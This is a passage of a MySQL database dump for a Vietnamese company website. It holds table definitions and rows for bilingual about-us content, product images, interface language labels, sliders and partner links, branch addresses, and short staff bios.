) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `gioithieu`
--

INSERT INTO `gioithieu` (`id`, `name`, `name_en`, `alias`, `image`, `mota`, `mota_en`, `content`, `content_en`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `status`, `created_at`, `updated_at`) VALUES
(1, 'Giới thiệu về công ty', 'About us', 'gioi-thieu-ve-cong-ty', '1513819499_about-1.jpg', '<p class=\"vk-about__title text-uppercase animation fadeIn animation-active\">C&ocirc;ng ty Cổ phần Thuận Đức được th&agrave;nh lập v&agrave;o ng&agrave;y 22/01/2007 tại Hưng Y&ecirc;n, Việt Nam bởi doanh nh&acirc;n Nguyễn Đức Cường, l&agrave; doanh nghiệp hoạt động trong lĩnh vực sản xuất c&aacute;c sản phẩm từ polypropylene, nổi bật l&agrave; hạt nhựa t&aacute;i chế v&agrave; bao b&igrave; PP.</p>', '<p>Shunde Joint Stock Company was established on January 22, 2007 in Hung Yen, Viet Nam by entrepreneur Nguyen Duc Cuong, an enterprise engaged in the production of polypropylene products, Recycle and PP packaging.</p>', '<p class=\"animation fadeIn animation-active\">B&ecirc;n cạnh việc sản xuất, ch&uacute;ng t&ocirc;i c&ograve;n nhập khẩu v&agrave; ph&acirc;n phối c&aacute;c sản phẩm như: phụ kiện HDPE h&agrave;n nối đầu, phụ kiện HDPE h&agrave;n điện trở, c&aacute;c loại m&aacute;y h&agrave;n ống nhựa HDPE, m&aacute;y thử &aacute;p lực&hellip;</p>\r\n<p class=\"animation fadeIn animation-active\">Tại C&ocirc;ng ty TNHH sản xuất nhựa Ch&acirc;u &Acirc;u ch&uacute;ng t&ocirc;i tin tưởng rằng chỉ c&oacute; nghi&ecirc;m ngặt tu&acirc;n theo quy tr&igrave;nh quản l&yacute; chất lượng để tạo ra những sản phẩm đạt chất lượng cao v&agrave; dịch vụ tốt, ch&uacute;ng t&ocirc;i mới chiếm được l&ograve;ng tin của kh&aacute;ch h&agrave;ng đồng thời x&aacute;c lập vị tr&iacute; của m&igrave;nh tr&ecirc;n thị trường, để người Việt c&oacute; thể tin d&ugrave;ng h&agrave;ng Việt</p>\r\n<div class=\"row\">\r\n<div class=\"col-lg-9\">\r\n<p class=\"animation fadeIn delay1 animation-active\"><strong>Lịch sử h&igrave;nh th&agrave;nh</strong></p>\r\n<p class=\"animation fadeIn delay1 animation-active\">C&ocirc;ng ty TNHH Thiết Bị Điện Nước H&agrave; Th&agrave;nh được ch&iacute;nh thức th&agrave;nh lập v&agrave; đi v&agrave;o hoạt động từ th&aacute;ng 3 năm 2009. Ng&agrave;nh nghề ch&iacute;nh của ch&uacute;ng t&ocirc;i l&agrave; sản xuất thiết bị điện nước mang thương hiệu HATHACO. Nh&agrave; m&aacute;y sản xuất phụ kiện ống nhựa HDPE đặt tại Th&agrave;nh phố Hải Dương. Với nhiều m&aacute;y &eacute;p phun, m&aacute;y &eacute;p gioăng cao su v&agrave; hơn 200 bộ khu&ocirc;n sản phẩm kh&aacute;c nhau, ch&uacute;ng t&ocirc;i đ&atilde; v&agrave; đang sản xuất cung cấp cho thị trường c&aacute;c loại phụ kiện HDPE vặn ren v&agrave; đai khởi thủy k&iacute;ch thước từ D20 đến D110 mang thương hiệu HATHACO đạt ti&ecirc;u chuẩn Dụng cụ bằng nhựa tiếp x&uacute;c trực tiếp thực phẩm của Bộ Y Tế: QCVN 12-1:2011/BYT v&agrave; tu&acirc;n theo Quy tr&igrave;nh quản l&yacute; chất lượng TCVN ISO 9001:2008.</p>\r\n<p class=\"animation fadeIn delay1 animation-active\">B&ecirc;n cạnh việc sản xuất, ch&uacute;ng t&ocirc;i c&ograve;n nhập khẩu v&agrave; ph&acirc;n phối c&aacute;c sản phẩm như: phụ kiện HDPE h&agrave;n nối đầu, phụ kiện HDPE h&agrave;n điện trở, c&aacute;c loại m&aacute;y h&agrave;n ống nhựa HDPE, m&aacute;y thử &aacute;p lực&hellip;</p>\r\n</div>\r\n</div>', '<p>Shunde Joint Stock Company was established on January 22, 2007 in Hung Yen, Viet Nam by entrepreneur Nguyen Duc Cuong, an enterprise engaged in the production of polypropylene products, Recycle and PP packaging.</p>\r\n<p>Shunde Joint Stock Company was established on January 22, 2007 in Hung Yen, Viet Nam by entrepreneur Nguyen Duc Cuong, an enterprise engaged in the production of polypropylene products, Recycle and PP packaging.Shunde Joint Stock Company was established on January 22, 2007 in Hung Yen, Viet Nam by entrepreneur Nguyen Duc Cuong, an enterprise engaged in the production of polypropylene products, Recycle and PP packaging.Shunde Joint Stock Company was established on January 22, 2007 in Hung Yen, Viet Nam by entrepreneur Nguyen Duc Cuong, an enterprise engaged in the production of polypropylene products, Recycle and PP packaging.Shunde Joint Stock Company was established on January 22, 2007 in Hung Yen, Viet Nam by entrepreneur Nguyen Duc Cuong, an enterprise engaged in the production of polypropylene products, Recycle and PP packaging.</p>', NULL, NULL, NULL, NULL, NULL, NULL, 1, '2017-12-21 02:45:24', '2017-12-20 19:45:24'),
(2, 'Quá trình phát triển', NULL, 'qua-trinh-phat-trien', NULL, NULL, NULL, '<p class=\"animation fadeIn animation-active\">B&ecirc;n cạnh việc sản xuất, ch&uacute;ng t&ocirc;i c&ograve;n nhập khẩu v&agrave; ph&acirc;n phối c&aacute;c sản phẩm như: phụ kiện HDPE h&agrave;n nối đầu, phụ kiện HDPE h&agrave;n điện trở, c&aacute;c loại m&aacute;y h&agrave;n ống nhựa HDPE, m&aacute;y thử &aacute;p lực&hellip;</p>\r\n<p class=\"animation fadeIn animation-active\">Tại C&ocirc;ng ty TNHH sản xuất nhựa Ch&acirc;u &Acirc;u ch&uacute;ng t&ocirc;i tin tưởng rằng chỉ c&oacute; nghi&ecirc;m ngặt tu&acirc;n theo quy tr&igrave;nh quản l&yacute; chất lượng để tạo ra những sản phẩm đạt chất lượng cao v&agrave; dịch vụ tốt, ch&uacute;ng t&ocirc;i mới chiếm được l&ograve;ng tin của kh&aacute;ch h&agrave;ng đồng thời x&aacute;c lập vị tr&iacute; của m&igrave;nh tr&ecirc;n thị trường, để người Việt c&oacute; thể tin d&ugrave;ng h&agrave;ng Việt</p>\r\n<div class=\"row\">\r\n<div class=\"col-lg-9\">\r\n<p class=\"animation fadeIn delay1 animation-active\"><strong>Lịch sử h&igrave;nh th&agrave;nh</strong></p>\r\n<p class=\"animation fadeIn delay1 animation-active\">C&ocirc;ng ty TNHH Thiết Bị Điện Nước H&agrave; Th&agrave;nh được ch&iacute;nh thức th&agrave;nh lập v&agrave; đi v&agrave;o hoạt động từ th&aacute;ng 3 năm 2009. Ng&agrave;nh nghề ch&iacute;nh của ch&uacute;ng t&ocirc;i l&agrave; sản xuất thiết bị điện nước mang thương hiệu HATHACO. Nh&agrave; m&aacute;y sản xuất phụ kiện ống nhựa HDPE đặt tại Th&agrave;nh phố Hải Dương. Với nhiều m&aacute;y &eacute;p phun, m&aacute;y &eacute;p gioăng cao su v&agrave; hơn 200 bộ khu&ocirc;n sản phẩm kh&aacute;c nhau, ch&uacute;ng t&ocirc;i đ&atilde; v&agrave; đang sản xuất cung cấp cho thị trường c&aacute;c loại phụ kiện HDPE vặn ren v&agrave; đai khởi thủy k&iacute;ch thước từ D20 đến D110 mang thương hiệu HATHACO đạt ti&ecirc;u chuẩn Dụng cụ bằng nhựa tiếp x&uacute;c trực tiếp thực phẩm của Bộ Y Tế: QCVN 12-1:2011/BYT v&agrave; tu&acirc;n theo Quy tr&igrave;nh quản l&yacute; chất lượng TCVN ISO 9001:2008.</p>\r\n<p class=\"animation fadeIn delay1 animation-active\">B&ecirc;n cạnh việc sản xuất, ch&uacute;ng t&ocirc;i c&ograve;n nhập khẩu v&agrave; ph&acirc;n phối c&aacute;c sản phẩm như: phụ kiện HDPE h&agrave;n nối đầu, phụ kiện HDPE h&agrave;n điện trở, c&aacute;c loại m&aacute;y h&agrave;n ống nhựa HDPE, m&aacute;y thử &aacute;p lực&hellip;</p>\r\n</div>\r\n</div>', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, '2017-12-21 02:45:39', '2017-12-20 19:45:39');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `images`
--

CREATE TABLE `images` (
  `id` int(10) UNSIGNED NOT NULL,
  `product_id` int(10) UNSIGNED NOT NULL DEFAULT '0',
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `image_path` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alt` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `stt` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `images`
--

INSERT INTO `images` (`id`, `product_id`, `name`, `alias`, `photo`, `status`, `image_path`, `alt`, `stt`, `created_at`, `updated_at`) VALUES
(1, 16, NULL, NULL, '1502966468_noithatnhaodep4.png', 1, NULL, NULL, 0, '2017-08-17 10:41:08', '0000-00-00 00:00:00'),
(61, 1, NULL, NULL, '1509674401_shop-item-1.png', 1, NULL, NULL, 0, '2017-11-03 02:00:01', '2017-11-03 02:00:01'),
(60, 4, NULL, NULL, '1509674112_shop-item-9.png', 1, NULL, NULL, 0, '2017-11-03 01:55:12', '2017-11-03 01:55:12'),
(50, 7, NULL, NULL, '1508904876_upload_3e7375be77c045c697b832dc04d83acc_large.jpg', 1, NULL, NULL, 0, '2017-10-25 04:14:36', '2017-10-25 04:14:36'),
(51, 6, NULL, NULL, '1508914601_upload_1a40f10151d041e3a934b15808a97249_master.jpg', 1, NULL, NULL, 0, '2017-10-25 06:56:41', '2017-10-25 06:56:41'),
(64, 2, NULL, NULL, '1509933631_shop-item-2.png', 1, NULL, NULL, 0, '2017-11-06 02:00:31', '2017-11-06 02:00:31'),
(96, 8, NULL, NULL, '1514251512_shop-detail-1.jpg', 1, NULL, NULL, 0, '2017-12-26 01:25:12', '2017-12-26 01:25:12'),
(97, 8, NULL, NULL, '1514251512_shop-item-1.jpg', 1, NULL, NULL, 0, '2017-12-26 01:25:12', '2017-12-26 01:25:12'),
(98, 8, NULL, NULL, '1514251512_shop-item-2.jpg', 1, NULL, NULL, 0, '2017-12-26 01:25:12', '2017-12-26 01:25:12'),
(81, 17, NULL, NULL, '1513937239_shop-item-9.jpg', 1, NULL, NULL, 0, '2017-12-22 10:07:19', '2017-12-22 10:07:19'),
(93, 11, NULL, NULL, '1514251127_shop-item-5.jpg', 1, NULL, NULL, 0, '2017-12-26 01:18:47', '2017-12-26 01:18:47'),
(94, 11, NULL, NULL, '1514251127_shop-item-6.jpg', 1, NULL, NULL, 0, '2017-12-26 01:18:47', '2017-12-26 01:18:47'),
(95, 11, NULL, NULL, '1514251127_shop-item-7.jpg', 1, NULL, NULL, 0, '2017-12-26 01:18:47', '2017-12-26 01:18:47'),
(62, 1, NULL, NULL, '1509674401_shop-item-2.png', 1, NULL, NULL, 0, '2017-11-03 02:00:01', '2017-11-03 02:00:01'),
(59, 4, NULL, NULL, '1509674112_shop-item-8.png', 1, NULL, NULL, 0, '2017-11-03 01:55:12', '2017-11-03 01:55:12'),
(58, 4, NULL, NULL, '1509674112_shop-item-7.png', 1, NULL, NULL, 0, '2017-11-03 01:55:12', '2017-11-03 01:55:12'),
(63, 1, NULL, NULL, '1509674401_shop-item-3.png', 1, NULL, NULL, 0, '2017-11-03 02:00:01', '2017-11-03 02:00:01'),
(65, 2, NULL, NULL, '1509933631_shop-item-3.png', 1, NULL, NULL, 0, '2017-11-06 02:00:31', '2017-11-06 02:00:31'),
(66, 2, NULL, NULL, '1509933631_shop-item-6.png', 1, NULL, NULL, 0, '2017-11-06 02:00:31', '2017-11-06 02:00:31'),
(80, 17, NULL, NULL, '1513937239_shop-item-8.jpg', 1, NULL, NULL, 0, '2017-12-22 10:07:19', '2017-12-22 10:07:19'),
(79, 17, NULL, NULL, '1513937239_shop-item-7.jpg', 1, NULL, NULL, 0, '2017-12-22 10:07:19', '2017-12-22 10:07:19'),
(82, 9, NULL, NULL, '1513993271_shop-item-6.jpg', 1, NULL, NULL, 0, '2017-12-23 01:41:11', '2017-12-23 01:41:11'),
(83, 9, NULL, NULL, '1513993271_shop-item-7.jpg', 1, NULL, NULL, 0, '2017-12-23 01:41:11', '2017-12-23 01:41:11'),
(84, 9, NULL, NULL, '1513993271_shop-item-8.jpg', 1, NULL, NULL, 0, '2017-12-23 01:41:11', '2017-12-23 01:41:11'),
(85, 13, NULL, NULL, '1513993707_shop-item-7.jpg', 1, NULL, NULL, 0, '2017-12-23 01:48:27', '2017-12-23 01:48:27'),
(86, 13, NULL, NULL, '1513993707_shop-item-8.jpg', 1, NULL, NULL, 0, '2017-12-23 01:48:27', '2017-12-23 01:48:27'),
(87, 13, NULL, NULL, '1513993707_shop-item-9.jpg', 1, NULL, NULL, 0, '2017-12-23 01:48:27', '2017-12-23 01:48:27'),
(92, 20, NULL, NULL, '1514186434_shop-item-2.jpg', 1, NULL, NULL, 0, '2017-12-25 07:20:34', '2017-12-25 07:20:34'),
(91, 20, NULL, NULL, '1513997607_shop-item-3.jpg', 1, NULL, NULL, 0, '2017-12-23 02:53:27', '2017-12-23 02:53:27');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `langs`
--

CREATE TABLE `langs` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_vi` text COLLATE utf8_unicode_ci NOT NULL,
  `name_en` text COLLATE utf8_unicode_ci,
  `title_en` text COLLATE utf8_unicode_ci,
  `alias` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `photo` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '0',
  `lever` int(11) NOT NULL DEFAULT '0',
  `title_vi` text COLLATE utf8_unicode_ci,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `description` longtext COLLATE utf8_unicode_ci,
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `langs`
--

INSERT INTO `langs` (`id`, `name_vi`, `name_en`, `title_en`, `alias`, `photo`, `status`, `lever`, `title_vi`, `keyword`, `description`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(32, 'Sản phẩm liên quan', 'Related products', NULL, '_sanphamlienquan', NULL, 1, 0, NULL, NULL, NULL, 'langs', 12, '2017-08-27 21:07:23', '2017-08-27 21:07:23'),
(31, 'Dịch vụ', 'Service', NULL, '_dichvu', NULL, 1, 0, NULL, NULL, NULL, 'langs', 10, '2017-10-09 08:14:14', '2017-10-09 01:14:14'),
(30, 'Danh mục sản phẩm', 'Product category', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 10, '2017-12-22 07:03:12', '2017-12-22 00:03:12'),
(29, 'Danh mục dự án', 'Project List', NULL, '_danhmucduan', NULL, 1, 0, NULL, NULL, NULL, 'langs', 9, '2017-08-26 01:13:13', '2017-08-25 18:13:13'),
(28, 'Tin tức sự kiện', 'News event', NULL, '_tintucsukien', NULL, 1, 0, NULL, NULL, NULL, 'langs', 8, '2017-08-24 23:40:43', '2017-08-24 23:40:43'),
(27, 'Giới thiệu', 'About Us', NULL, '_gioithieu', NULL, 1, 0, NULL, NULL, NULL, 'langs', 7, '2017-10-09 08:12:46', '2017-10-09 01:12:46'),
(21, 'Trang chủ', 'Home', NULL, NULL, NULL, 0, 0, NULL, NULL, NULL, 'langs', NULL, '2017-12-20 08:07:27', '2017-12-20 01:07:27'),
(22, 'Sản phẩm', 'Product', NULL, '_sanpham', NULL, 1, 0, NULL, NULL, NULL, 'langs', 2, '2017-08-22 02:50:27', '2017-08-22 02:50:27'),
(23, 'Dự án', 'Project', NULL, '_duan', NULL, 1, 0, NULL, NULL, NULL, 'langs', 3, '2017-08-22 02:51:17', '2017-08-22 02:51:17'),
(24, 'Tin tức', 'News', NULL, '_tintuc', NULL, 1, 0, NULL, NULL, NULL, 'langs', 4, '2017-08-22 02:51:30', '2017-08-22 02:51:30'),
(25, 'Liên hệ', 'Contact', NULL, '_lienhe', NULL, 1, 0, NULL, NULL, NULL, 'langs', 5, '2017-08-22 02:51:42', '2017-08-22 02:51:42'),
(26, 'Tin mới', 'News', NULL, '_tinmoi', NULL, 1, 0, NULL, NULL, NULL, 'langs', 16, '2017-08-26 04:09:58', '2017-08-25 21:09:58'),
(33, 'Họ tên', 'Name', NULL, '_hoten', NULL, 1, 0, NULL, NULL, NULL, 'langs', 13, '2017-08-27 21:41:35', '2017-08-27 21:41:35'),
(34, 'Số điện thoại', 'Phone', NULL, '_sodienthoai', NULL, 1, 0, NULL, NULL, NULL, 'langs', 14, '2017-08-27 21:41:49', '2017-08-27 21:41:49'),
(35, 'Địa chỉ', 'Address', NULL, '_diachi', NULL, 1, 0, NULL, NULL, NULL, 'langs', 15, '2017-08-27 21:42:03', '2017-08-27 21:42:03'),
(36, 'Nội dung', 'Content', NULL, '_noidung', NULL, 1, 0, NULL, NULL, NULL, 'langs', 16, '2017-08-27 21:42:21', '2017-08-27 21:42:21'),
(37, 'Gửi', 'Send', NULL, '_gui', NULL, 1, 0, NULL, NULL, NULL, 'langs', 17, '2017-08-27 21:42:32', '2017-08-27 21:42:32'),
(38, 'Tin tức liên quan', 'Related news', NULL, '_tintuclienquan', NULL, 1, 0, NULL, NULL, NULL, 'langs', 18, '2017-08-28 01:49:13', '2017-08-28 01:49:13'),
(39, 'Tìm kiếm', 'Search', NULL, '_timkiem', NULL, 1, 0, NULL, NULL, NULL, 'langs', 19, '2017-10-09 03:12:37', '2017-10-09 03:12:37'),
(40, 'Từ khóa tìm kiếm', 'Keyword search', NULL, '_tukhoatimkiem', NULL, 1, 0, NULL, NULL, NULL, 'langs', 20, '2017-10-09 03:14:05', '2017-10-09 03:14:05'),
(41, 'Dịch vụ của chúng tôi', 'Our services', NULL, '_dichvucuachung toi', NULL, 1, 0, NULL, NULL, NULL, 'langs', 21, '2017-10-10 20:20:15', '2017-10-10 20:20:15'),
(42, 'Về chúng tôi', 'About us', NULL, '_vechungtoi', NULL, 1, 0, NULL, NULL, NULL, 'langs', 22, '2017-10-11 01:55:11', '2017-10-11 01:55:11'),
(43, 'Tầm nhìn sứ mệnh', 'Vision, mission', NULL, '_tamnhinsumenh', NULL, 1, 0, NULL, NULL, NULL, 'langs', 23, '2017-10-11 01:58:09', '2017-10-11 01:58:09'),
(44, 'Nhân sự chủ chốt', 'Key personnel', NULL, '_nhansuchuchot', NULL, 1, 0, NULL, NULL, NULL, 'langs', 24, '2017-10-11 01:58:31', '2017-10-11 01:58:31'),
(45, 'Diện tích', 'Acreage', NULL, '_dientich', NULL, 1, 0, NULL, NULL, NULL, 'langs', 25, '2017-10-12 20:09:06', '2017-10-12 20:09:06'),
(46, 'Thiết kế, thi công', 'Construction Design', NULL, '_thietkethicong', NULL, 1, 0, NULL, NULL, NULL, 'langs', 26, '2017-10-12 20:09:33', '2017-10-12 20:09:33'),
(47, 'Đọc tiếp', 'Read more', NULL, '_doctiep', NULL, 1, 0, NULL, NULL, NULL, 'langs', 27, '2017-10-13 00:39:31', '2017-10-13 00:39:31'),
(49, 'Liên kết', 'Link', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 28, '2017-12-20 01:59:09', '2017-12-20 01:59:09'),
(50, 'Mạng xã hội', 'Socialite', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 29, '2017-12-20 02:00:13', '2017-12-20 02:00:13'),
(51, 'Gửi liên hệ', 'Send contact', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 30, '2017-12-21 18:36:59', '2017-12-21 18:36:59'),
(52, 'Đăng kí nhận báo giá', 'Sign up for a quote', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 31, '2017-12-21 23:52:51', '2017-12-21 23:52:51'),
(53, 'Khách hàng', 'Customer', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 32, '2018-04-23 08:58:16', '2018-04-23 01:58:16'),
(54, 'Sự khác biệt', 'Difference', NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, 'langs', 33, '2017-12-24 20:20:01', '2017-12-24 20:20:01');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `lienket`
--

CREATE TABLE `lienket` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `link` text COLLATE utf8_unicode_ci,
  `photo` text COLLATE utf8_unicode_ci,
  `mota` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `noibat` int(11) NOT NULL DEFAULT '0',
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `lienket`
--

INSERT INTO `lienket` (`id`, `user_id`, `name`, `link`, `photo`, `mota`, `content`, `status`, `noibat`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(4, 5, 'Slider 1', NULL, '1503972273_banner.png', NULL, NULL, 1, 0, 'slider', 1, '2017-08-29 02:04:33', '2017-08-28 19:04:33'),
(5, 5, 'Slider 2', 'http://gco.vn/', '1503972281_banner.png', NULL, NULL, 1, 0, 'slider', 2, '2017-08-29 02:04:41', '2017-08-28 19:04:41'),
(8, 5, 'Chị Thanh Lam', NULL, '1504774299_relation-3.png', NULL, NULL, 1, 0, 'cam-nhan', 1, '2017-09-07 08:51:40', '2017-09-07 01:51:40'),
(9, 5, 'Chị Lê Thu Thủy', 'http://gco.vn/', '1504774309_relation-4.png', NULL, NULL, 1, 0, 'cam-nhan', 2, '2017-09-07 08:51:49', '2017-09-07 01:51:49'),
(10, 5, 'Chị Khánh Ngọc', NULL, '1504774321_relation-1.png', NULL, NULL, 1, 0, 'cam-nhan', 3, '2017-09-07 08:52:01', '2017-09-07 01:52:01'),
(11, 5, 'Anh Tuấn Lâm Nhã', NULL, '1504774330_relation-2.png', NULL, NULL, 1, 0, 'cam-nhan', 4, '2017-09-07 08:52:10', '2017-09-07 01:52:10'),
(45, 5, 'right sidebarx', NULL, '1536136213_Untitled-5-01.jpg', NULL, NULL, 1, 0, 'tieu-chi', 1, '2018-09-05 08:30:13', '2018-09-05 01:30:13'),
(16, 5, 'Chi nhánh Hà Nội', 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3724.761607615941!2d105.82071311450424!3d21.00219108601282!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135ac83e47ecaa9%3A0x110275dc966aadd8!2sToyota+Thanh+Xu%C3%A2n!5e0!3m2!1svi!2s!4v1504085273578', '1502782745_bv3.jpg', 'Số 65 Cửa Bắc, Phường Trúc Bạch, Quận Ba Đình', '<p>X&atilde; Trưng Trắc, Huyện Văn L&acirc;m, Tỉnh Hưng Y&ecirc;n&nbsp;<br />Tel: (0321)3997151&nbsp;<br />Fax: (0321) 3997152&nbsp;<br />Email: chauhungjsc@hn.vnn.vn</p>', 1, 0, 'chi-nhanh', 1, '2017-09-05 09:34:50', '2017-09-05 02:34:50'),
(17, 5, 'Chi nhánh HCM', 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3724.761607615941!2d105.82071311450424!3d21.00219108601282!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135ac83e47ecaa9%3A0x110275dc966aadd8!2sToyota+Thanh+Xu%C3%A2n!5e0!3m2!1svi!2s!4v1504085273578', '1502782773_bv1.jpg', '85 Nguyễn Thị Thập(Khu dân cư Himlam, Phường Tân Hưng) Quận 7', '<p>144 Khuất Duy Tiến, P. Nh&acirc;n Ch&iacute;nh, Q. Thanh Xu&acirc;n, HN<br />Tel: (0321)3997151&nbsp;<br />Fax: (0321) 3997152&nbsp;</p>', 1, 0, 'chi-nhanh', 2, '2017-09-05 09:35:59', '2017-09-05 02:35:59'),
(25, 5, 'Đối tác 1', 'http://gco.vn/', '1503974583_dt3.png', NULL, NULL, 1, 0, 'doi-tac', 1, '2017-08-28 19:43:03', '2017-08-28 19:43:03'),
(26, 5, 'Đối tác 2', NULL, '1503974601_dt2.png', NULL, NULL, 1, 0, 'doi-tac', 2, '2017-08-28 19:43:21', '2017-08-28 19:43:21'),
(27, 5, 'Đối tác 3', NULL, '1503974611_dt4.png', NULL, NULL, 1, 0, 'doi-tac', 3, '2017-08-28 19:43:31', '2017-08-28 19:43:31'),
(28, 5, 'Đối tác 4', NULL, '1503974620_dt1.png', NULL, NULL, 1, 0, 'doi-tac', 4, '2017-08-28 19:43:40', '2017-08-28 19:43:40'),
(29, 5, 'Đối tác 5', 'http://gco.vn/', '1503974634_dt5.png', NULL, NULL, 1, 0, 'doi-tac', 5, '2017-08-28 19:43:54', '2017-08-28 19:43:54'),
(35, 5, 'Hình 1', 'http://gco.vn/', '1504230555_1.jpg', NULL, NULL, 1, 0, 'gioi-thieu', 1, '2017-08-31 18:49:15', '2017-08-31 18:49:15'),
(36, 5, 'Hình ảnh 2', NULL, '1504230566_2.jpg', NULL, NULL, 1, 0, 'gioi-thieu', 2, '2017-08-31 18:49:26', '2017-08-31 18:49:26');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `linhvuc`
--

CREATE TABLE `linhvuc` (
  `id` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `name_en` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `linhvuc`
--

INSERT INTO `linhvuc` (`id`, `name`, `name_en`, `created_at`, `updated_at`) VALUES
(3, 'Kinh doanh', 'kkk', '2017-12-21 01:56:09', '2017-12-21 01:56:09'),
(4, 'Kế toán', 'kkkkdgdg', '2017-12-21 01:58:21', '2017-12-21 01:58:21'),
(5, 'Bán hàng', 'vccccsss', '2017-12-21 01:58:51', '2017-12-21 01:58:51');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `members`
--

CREATE TABLE `members` (
  `id` int(11) NOT NULL,
  `name` varchar(250) DEFAULT NULL,
  `position` varchar(250) DEFAULT NULL,
  `des` text,
  `des_en` text,
  `photo` text,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `members`
--

INSERT INTO `members` (`id`, `name`, `position`, `des`, `des_en`, `photo`, `created_at`, `updated_at`) VALUES
(1, 'Linh Nguyễn', 'Project Management', 'Tốt nghiệp loại khá - Trường đại học ngoại thương.\r\n2 năm kinh nghiệm trong vị trí quản lý dự án.\r\nQuản lý dự án của công ty.\r\nPhụ trách kiểm soát tổng thể các dự án.\r\nThúc đẩy tiến độ công việc.\r\nCam kết dealine với khách hàng.', NULL, '1526458985_6.jpg', '2018-06-25 15:40:42', '2018-06-25 08:40:42'),
(2, 'Quách Văn Sơn', 'Designer Team Leader', 'Tốt nghiệp FPT ARENA (TPHCM) 2012\r\n- 6 năm kinh nghiệm trong lĩnh vực thiết kế ứng dụng thương hiệu (Brand Application), truyền thông marketing và ứng dụng tương tác (UI Design), tham gia các dự án phát triển thương hiệu cho VDC, VNPT (MCA, Tax...) \r\n- Trưởng nhóm thiết kế.\r\n- Phụ trách toàn bộ dự án thiết kế cho khách hàng.\r\n- Lên kế hoạch và ý tưởng thiết kế dự án khách hàng.', NULL, '1539659796_9.jpg', '2018-10-16 03:16:36', '2018-10-15 20:16:36'),
(3, 'Thủy Tin', 'Brand Design/UI Design', 'Tốt nghiệp Hanoi Arena, 3năm + trong lĩnh vực thiết kế thương hiệu và các sản phẩm in ấn, chuyên viên thiết kế chịu trách nhiệm lĩnh vực sáng tạo Logo, phát triển hệ thống nhận diện thương hiệu trực quan, các dự án về sản phẩm in ấn, hình ảnh Website và các ứng dụng truyền thông.', NULL, '1531477706_15.jpg', '2018-07-13 10:29:38', '2018-07-13 03:29:38'),
